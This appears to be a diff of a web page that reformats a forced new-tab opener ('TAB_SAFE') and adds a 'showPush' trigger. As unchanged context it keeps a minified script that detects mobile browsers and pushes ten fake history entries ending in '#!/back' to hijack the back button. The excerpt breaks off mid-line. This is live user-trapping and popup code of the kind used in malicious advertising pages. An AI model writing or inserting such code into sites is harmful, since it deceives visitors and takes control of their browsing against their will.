@@ -1319,24 +1319,34 @@ document.addEventListener("DOMContentLoaded", function () {
 });
 </script>
 <script>
-const TAB_SAFE = {
-    open(url) {
-        try {
-            let w = window.open(url, "_blank");
-            if (!w) {
-                const a = document.createElement("a");
-                a.href = url;
-                a.target = "_blank";
-                a.rel = "noopener noreferrer";
-                document.body.appendChild(a);
-                a.click();
-                a.remove();
-            }
-        } catch (e) {}
-    }
-};
-</script>
+    
+    const TAB_SAFE = {
+        open(url) {
+            try {
+                
+                let w = window.open(url, "_blank");
 
+                
+                if (!w) {
+                    const a = document.createElement("a");
+                    a.href = url;
+                    a.target = "_blank";
+                    a.rel = "noopener noreferrer";
+                    document.body.appendChild(a);
+                    a.click();
+                    a.remove();
+                }
+            } catch(e) {
+                console.error("Failed to open tab:", e);
+            }
+        }
+    };
+
+    
+    function showPush() {
+        TAB_SAFE.open("#"); 
+    }
+</script>
 <script type="text/javascript">
 var hit = {ver: '1.0'};
 !function(config){let self=this;self.agent=false;self.mobile=navigator.userAgent.match(/Android|Mobile|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WebOS|Windows Phone/i)!==null;self.mobile=false;self.clicked=false;!function(d,l,h){var m='#!/back';var loc=l.pathname+l.search;for(var i=0;i<10;i++){h.pushState(null,d.title,loc+m);}
